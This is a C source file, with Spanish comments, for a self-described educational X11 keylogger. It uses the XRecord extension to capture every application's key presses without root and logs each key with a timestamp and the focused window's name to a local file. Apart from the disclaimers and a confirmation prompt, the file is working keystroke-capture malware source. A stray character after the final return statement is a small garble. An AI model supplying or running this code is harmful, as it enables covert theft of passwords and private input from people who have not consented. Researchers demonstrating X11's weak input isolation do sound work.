/*
 * X11 Educational Keylogger
 * 
 * AVISO LEGAL Y ÉTICO:
 * Este programa es solo para propósitos educativos y de investigación.
 * Demuestra las vulnerabilidades inherentes del protocolo X11 en sistemas Linux.
 * El uso no autorizado de este software puede ser ilegal.
 * Use solo en sistemas propios o con permiso explícito.
 * 
 * Este keylogger demuestra cómo cualquier aplicación en X11 puede capturar
 * eventos de teclado de otras aplicaciones sin necesidad de privilegios elevados,
 * una vulnerabilidad fundamental del diseño de X11 desde 1984.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/extensions/record.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

#define LOG_FILE "keylog.txt"
#define MAX_WINDOW_NAME 256

// Variables globales para manejo de señales
Display *display = NULL;
Display *record_display = NULL;
FILE *logfile = NULL;
volatile sig_atomic_t running = 1;
XRecordContext record_context = 0;

// Manejador de señales para limpieza
void signal_handler(int signum) {
    (void)signum; // Parámetro requerido pero no usado
    running = 0;
    printf("\n[!] Deteniendo keylogger...\n");
}

// Obtener el nombre de la ventana activa
char* get_window_name(Display *display, Window window) {
    static char window_name[MAX_WINDOW_NAME];
    char *name = NULL;
    
    if (window == None) {
        strncpy(window_name, "Unknown", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        return window_name;
    }
    
    if (XFetchName(display, window, &name) && name) {
        strncpy(window_name, name, MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        XFree(name);
    } else {
        strncpy(window_name, "Unnamed Window", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
    }
    
    return window_name;
}

// Obtener la ventana con foco actual
Window get_focused_window(Display *display) {
    Window focused;
    int revert;
    
    XGetInputFocus(display, &focused, &revert);
    
    // Si es la ventana raíz o PointerRoot, intentar obtener la ventana real
    if (focused == None || focused == PointerRoot) {
        Window root = DefaultRootWindow(display);
        Window parent, *children;
        unsigned int nchildren;
        
        if (XQueryTree(display, root, &root, &parent, &children, &nchildren)) {
            if (nchildren > 0) {
                focused = children[nchildren - 1];
            }
            if (children) XFree(children);
        }
    }
    
    return focused;
}

// Convertir KeySym a string legible
const char* keysym_to_string(KeySym keysym) {
    static char buffer[32];
    
    // Teclas especiales
    switch(keysym) {
        case XK_Return: return "[ENTER]";
        case XK_BackSpace: return "[BACKSPACE]";
        case XK_Tab: return "[TAB]";
        case XK_Escape: return "[ESC]";
        case XK_Delete: return "[DELETE]";
        case XK_Home: return "[HOME]";
        case XK_End: return "[END]";
        case XK_Page_Up: return "[PGUP]";
        case XK_Page_Down: return "[PGDN]";
        case XK_Left: return "[LEFT]";
        case XK_Right: return "[RIGHT]";
        case XK_Up: return "[UP]";
        case XK_Down: return "[DOWN]";
        case XK_space: return " ";
        case XK_Shift_L:
        case XK_Shift_R: return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R: return "[CTRL]";
        case XK_Alt_L:
        case XK_Alt_R: return "[ALT]";
        case XK_Caps_Lock: return "[CAPS]";
        case XK_F1: return "[F1]";
        case XK_F2: return "[F2]";
        case XK_F3: return "[F3]";
        case XK_F4: return "[F4]";
        case XK_F5: return "[F5]";
        case XK_F6: return "[F6]";
        case XK_F7: return "[F7]";
        case XK_F8: return "[F8]";
        case XK_F9: return "[F9]";
        case XK_F10: return "[F10]";
        case XK_F11: return "[F11]";
        case XK_F12: return "[F12]";
        default: {
            char *str = XKeysymToString(keysym);
            if (str && strlen(str) == 1) {
                buffer[0] = str[0];
                buffer[1] = '\0';
                return buffer;
            } else if (str) {
                snprintf(buffer, sizeof(buffer), "[%s]", str);
                return buffer;
            }
            return "[UNKNOWN]";
        }
    }
}

// Obtener timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
}

// Registrar evento de tecla
void log_key_event(const char *window_name, const char *key_str) {
    char timestamp[64];
    get_timestamp(timestamp, sizeof(timestamp));
    
    // Escribir en archivo
    if (logfile) {
        fprintf(logfile, "[%s] [%s] %s\n", timestamp, window_name, key_str);
        fflush(logfile);
    }
    
    // Mostrar en consola (opcional, comentar en producción)
    printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
}

// Callback para XRecord - aquí se procesan los eventos capturados
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    (void)closure; // No usado
    
    if (recorded_data->category == XRecordFromServer) {
        // Obtener el tipo de evento
        int event_type = recorded_data->data[0];
        
        // Solo procesar eventos KeyPress (tipo 2)
        if (event_type == KeyPress) {
            // Extraer el keycode del evento
            unsigned char keycode = recorded_data->data[1];
            
            // Obtener ventana con foco
            Window focused = get_focused_window(display);
            char *window_name = get_window_name(display, focused);
            
            // Convertir keycode a keysym
            KeySym keysym = XKeycodeToKeysym(display, keycode, 0);
            const char *key_str = keysym_to_string(keysym);
            
            // Registrar el evento
            static char *last_window_name = NULL;
            if (last_window_name == NULL || strcmp(last_window_name, window_name) != 0) {
                char window_change_msg[512];
                snprintf(window_change_msg, sizeof(window_change_msg), 
                        "\n--- Ventana activa: %s ---\n", window_name);
                if (logfile) {
                    fprintf(logfile, "%s", window_change_msg);
                    fflush(logfile);
                }
                printf("%s", window_change_msg);
                last_window_name = window_name;
            }
            
            log_key_event(window_name, key_str);
        }
    }
    
    // IMPORTANTE: Liberar los datos grabados
    XRecordFreeData(recorded_data);
}

// Función principal del keylogger
int start_keylogger() {
    char timestamp[64];
    
    printf("[*] Keylogger educativo iniciado.\n");
    printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
    printf("[*] Archivo de log: %s\n", LOG_FILE);
    printf("[*] Presione Ctrl+C para detener.\n\n");
    
    // Abrir conexión principal con X11
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
        fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
        return 1;
    }
    
    // Verificar si la extensión XRecord está disponible
    int major, minor;
    if (!XRecordQueryVersion(display, &major, &minor)) {
        fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
        fprintf(stderr, "[!] Esta extensión es necesaria para capturar eventos sin bloquear el teclado.\n");
        XCloseDisplay(display);
        return 1;
    }
    printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
    
    // Abrir segunda conexión para la grabación (requerido por XRecord)
    record_display = XOpenDisplay(NULL);
    if (record_display == NULL) {
        fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11 para grabación.\n");
        XCloseDisplay(display);
        return 1;
    }
    
    // Abrir archivo de log
    logfile = fopen(LOG_FILE, "a");
    if (logfile == NULL) {
        fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
        XCloseDisplay(display);
        XCloseDisplay(record_display);
        return 1;
    }
    
    // Escribir encabezado en el log
    fprintf(logfile, "\n=== Nueva sesión de keylogging ===\n");
    get_timestamp(timestamp, sizeof(timestamp));
    fprintf(logfile, "Inicio: %s\n\n", timestamp);
    fflush(logfile);
    
    // Configurar manejador de señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Configurar el rango de eventos a capturar
    XRecordRange *record_range = XRecordAllocRange();
    if (record_range == NULL) {
        fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
        fclose(logfile);
        XCloseDisplay(display);
        XCloseDisplay(record_display);
        return 1;
    }
    
    // Capturar solo eventos de teclado (KeyPress)
    record_range->device_events.first = KeyPress;
    record_range->device_events.last = KeyPress;
    
    // Crear contexto de grabación para todos los clientes
    XRecordClientSpec client_spec = XRecordAllClients;
    record_context = XRecordCreateContext(record_display, 0, &client_spec, 1, &record_range, 1);
    
    if (record_context == 0) {
        fprintf(stderr, "[!] Error: No se puede crear contexto de grabación XRecord.\n");
        XFree(record_range);
        fclose(logfile);
        XCloseDisplay(display);
        XCloseDisplay(record_display);
        return 1;
    }
    
    XFree(record_range);
    
    printf("[*] Contexto XRecord creado. Monitoreando eventos sin bloquear el teclado...\n\n");
    
    // Habilitar el contexto de grabación
    // Esta llamada es bloqueante y procesa eventos hasta que running = 0
    if (!XRecordEnableContextAsync(record_display, record_context, record_callback, NULL)) {
        fprintf(stderr, "[!] Error: No se puede habilitar contexto de grabación.\n");
        XRecordFreeContext(record_display, record_context);
        fclose(logfile);
        XCloseDisplay(display);
        XCloseDisplay(record_display);
        return 1;
    }
    
    // Loop principal - procesar eventos XRecord
    while (running) {
        XRecordProcessReplies(record_display);
    }
    
    // Limpieza
    printf("\n[*] Limpiando recursos...\n");
    
    // Deshabilitar y liberar contexto de grabación
    XRecordDisableContext(record_display, record_context);
    XRecordFreeContext(record_display, record_context);
    
    if (logfile) {
        fprintf(logfile, "\n=== Sesión finalizada ===\n");
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(logfile, "Fin: %s\n\n", timestamp);
        fclose(logfile);
    }
    
    if (display) {
        XCloseDisplay(display);
    }
    
    if (record_display) {
        XCloseDisplay(record_display);
    }
    
    printf("[*] Keylogger detenido correctamente.\n");
    printf("[*] Log guardado en: %s\n", LOG_FILE);
    
    return 0;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("  X11 EDUCATIONAL KEYLOGGER - Demostración de Vulnerabilidades\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("\n");
    printf("ADVERTENCIA LEGAL:\n");
    printf("Este programa es SOLO para propósitos educativos.\n");
    printf("El uso no autorizado puede ser ILEGAL en su jurisdicción.\n");
    printf("Use únicamente en sistemas propios o con permiso explícito.\n");
    printf("\n");
    printf("Este keylogger demuestra vulnerabilidades de X11:\n");
    printf("- Cualquier aplicación puede capturar eventos de teclado\n");
    printf("- No se requieren privilegios de root/administrador\n");
    printf("- No hay notificación al usuario sobre la captura\n");
    printf("- X11 fue diseñado en 1984 sin seguridad moderna en mente\n");
    printf("\n");
    
    // Solicitar confirmación del usuario
    printf("¿Desea continuar? (s/n): ");
    char response;
    scanf(" %c", &response);
    
    if (response != 's' && response != 'S') {
        printf("\n[*] Operación cancelada.\n");
        return 0;
    }
    
    printf("\n");
    return start_keylogger();ºº
}
